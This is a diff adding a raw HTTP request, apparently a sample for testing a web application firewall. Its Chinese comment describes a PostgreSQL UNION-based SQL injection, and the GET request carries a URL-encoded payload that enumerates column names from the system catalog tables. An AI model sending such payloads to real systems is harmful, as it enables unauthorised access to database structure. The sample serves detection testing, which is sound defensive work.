@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506360
+# 攻击者基于union查询，将"UNION select attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='test' AND nspname='public' "语句注入到 SQL 查询参数中，从系统表 pg_namespace,pg_type,pg_attribute中查询模式为public的所有表的所有列名信息。
+GET /?id=1%20UNION%20select%20attname%20FROM%20pg_namespace%2Cpg_type%2Cpg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid=b.attrelid%20WHERE%20a.relnamespace=pg_namespace.oid%20AND%20pg_type.oid=b.atttypid%20AND%20attnum%3E0%20AND%20a.relname=%27test%27%20AND%20nspname=%27public%27%20&bid=hd_tag_m8mv23y7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23y7
+RM-PRO-Token: 7a4318836ba160355a569a1d77629168
+RM-PRO-Time: 1742808352567
+User-Agent: curl/7.83.1
+
